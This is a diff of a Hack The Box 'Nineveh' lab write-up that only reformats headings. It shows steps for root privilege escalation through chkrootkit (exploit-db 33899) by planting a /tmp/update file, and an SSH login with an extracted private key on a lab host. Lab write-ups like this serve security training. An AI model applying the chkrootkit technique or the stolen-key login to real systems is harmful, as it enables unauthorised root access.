@@ -96,9 +96,9 @@ www-data@nineveh:/var/tmp$ ./procmon.sh
 < ps -eo command
 ...
 ```
-### "< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
-### Then create a update file placed /tmp as /tmp/update
-### "/3"--> as Third terminal!
+#### "< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
+#### Then create a update file placed /tmp as /tmp/update
+#### "/3"--> as Third terminal!
 ```shell
 --------------------------------------------------------------------
 #!/bin/bash
@@ -180,4 +180,4 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 ```
 #### Finally readly to connect:
-**** root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43
+****root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43****
